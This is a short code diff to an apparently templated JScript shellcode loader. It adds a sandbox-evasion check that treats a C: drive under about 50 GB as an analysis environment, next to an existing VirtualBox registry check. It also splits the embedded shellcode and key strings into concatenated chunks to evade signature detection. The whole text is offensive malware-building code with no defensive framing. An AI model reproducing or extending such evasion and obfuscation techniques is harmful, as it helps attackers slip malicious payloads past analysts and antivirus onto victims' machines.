@@ -52,11 +52,16 @@ function {{ v.fn_sandbox }}() {
         sh2.RegRead("HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions\\Version");
         return true;
     } catch(e) {}
+    try {
+        var fso = new ActiveXObject("Scripting.FileSystemObject");
+        var drv = fso.GetDrive("C:");
+        if (drv.TotalSize < 53687091200) return true;
+    } catch(e) {}
     return false;
 }
 
-var {{ v.var_sc }}  = "{{ shellcode_hex }}";
-var {{ v.var_key }} = "{{ key_hex }}";
+var {{ v.var_sc }}  = {% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %};
+var {{ v.var_key }} = {% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %};
 
 function {{ v.fn_hex2arr }}(h) {
     var a = []; for (var i = 0; i < h.length; i += 2)
